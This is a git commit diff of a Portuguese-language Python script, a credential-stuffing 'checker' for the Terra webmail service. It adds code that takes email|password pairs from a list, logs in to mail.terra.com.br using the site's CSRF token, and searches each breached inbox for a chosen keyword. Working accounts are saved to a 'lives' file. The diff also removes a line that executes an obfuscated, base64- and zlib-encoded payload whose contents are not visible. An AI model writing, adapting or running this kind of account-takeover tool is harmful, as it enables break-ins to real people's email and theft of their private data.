e8a069db1dade2b970208df2cb1e40d5204c275a
InfoSec <169016436+InfoSecOFC@users.noreply.github.com>
2024-05-06 02:02:35 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,142 @@
+import requests
+from colorama import Fore
+import os
+import time
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+def trazer(string,start,end):
+	str = string.split(start)
+	str = str[1].split(end)
+	return str[0]
+	pass
+
+if not os.path.exists('resultados'):
+    os.makedirs('resultados')
+    
+else:
+    pass
+  
+os.system("clear")
+# Banner criado pelo link: https://www.patorjk.com/software/taag/#p=display&v=2&f=ANSI%20Regular&t=%40Russo_171
+print(f'''{Fore.GREEN}
+      
+
+ ██████  ██████  ██    ██ ███████ ███████  ██████           ██ ███████  ██ 
+██    ██ ██   ██ ██    ██ ██      ██      ██    ██         ███      ██ ███ 
+██ ██ ██ ██████  ██    ██ ███████ ███████ ██    ██          ██     ██   ██ 
+██ ██ ██ ██   ██ ██    ██      ██      ██ ██    ██          ██    ██    ██ 
+ █ ████  ██   ██  ██████  ███████ ███████  ██████  ███████  ██    ██    ██ 
+                                                                           
+
+''')
+
+print(f'{Fore.YELLOW} Telegram: @cafe_com_codigo | @InfoSecGroup7\n\n')
+
+palavra = input("\nDigite a palavra a ser consultada: ")
+
+texto = open('lista.txt').readlines()
+
+for x in texto:
+    logins = x.strip()
+    lista = logins.split('|')
+    email = lista[0]
+    senha = lista[1]
+    
+    s = requests.session()
+
+    headers = {
+        'Host': 'mail.terra.com.br',
+        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua-mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        'sec-ch-ua-platform': '"Windows"',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://mail.terra.com.br/',
+        'Accept-Language': 'pt-PT,pt;q=0.9', 
+    }
+
+    r1 = requests.get('https://mail.terra.com.br/mail/index.php?r=site/csrf&format=json', headers=headers).text
+    
+    time.sleep(1)
+    
+    try:
+        token = trazer(r1, 'CSRF":"', '"')
+        
+    except:
+        time.sleep(2)
+        pass
+    
+    headers = {
+        'Host': 'mail.terra.com.br',
+        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua-mobile': '?0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+        'sec-ch-ua-platform': '"Windows"',
+        'Origin': 'https://mail.terra.com.br',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://mail.terra.com.br/',
+        'Accept-Language': 'pt-PT,pt;q=0.9',
+    }
+  
+    data = {
+        'YII_CSRF_TOKEN': token,
+        'LoginForm[username]': email,
+        'LoginForm[password]': senha,
+    }
+  
+    r2 = s.post(
+        'https://mail.terra.com.br/mail/index.php?r=site/login&format=json',
+        
+        headers=headers,
+        data=data,
+    ).text
+    
+    if 'valid":true' in r2:
+    
+        headers = {
+            'Host': 'mail.terra.com.br',
+            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+            'sec-ch-ua-mobile': '?0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+            'sec-ch-ua-platform': '"Windows"',
+            'Accept': '*/*',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': 'https://mail.terra.com.br/ozone/',
+            'Accept-Language': 'pt-PT,pt;q=0.9',
+        }
+        
+        r3 = s.get(
+            f'https://mail.terra.com.br/ws/index.php?r=message/wslist&format=json&MailBox%5Bmailbox_id%5D=INBOX&MessageAsQuery%5Benvelope%5D%5Bfrom%5D={palavra}&MessageAsQuery%5Benvelope%5D%5Bto%5D={palavra}&MessageAsQuery%5Benvelope%5D%5Bsubject%5D={palavra}&orderedByRequest=1&sort_field=_ARRIVAL_&sort_orientation=_ASC_',
+            
+            headers=headers,
+        ).text
+         
+        if palavra in r3:
+            print(f'{Fore.GREEN}\n[+] Aprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
+            f = open("resultados/lives.txt", "a")
+            f.write(f"\n[+] Aprovado => {email}|{senha} => Palavra: {palavra}\nChecker criado por: @Russo_171")
+            f.close()
+            
+        else:
+            print(f'{Fore.YELLOW}\n[-] Email/Senha corretos, porém a palavra não foi encontrada => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
+            f = open("resultados/palavra_nao_encontrada.txt", "a")
+            f.write(f"\n[-] Email/Senha corretos, porém a palavra não foi encontrada => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171")
+            f.close()
+        
+    else:
+        print(f'{Fore.RED}\n[-] Reprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
+        f = open("resultados/dies.txt", "a")
+        f.write(f"\n[-] Reprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171")
+        f.close()
+
+
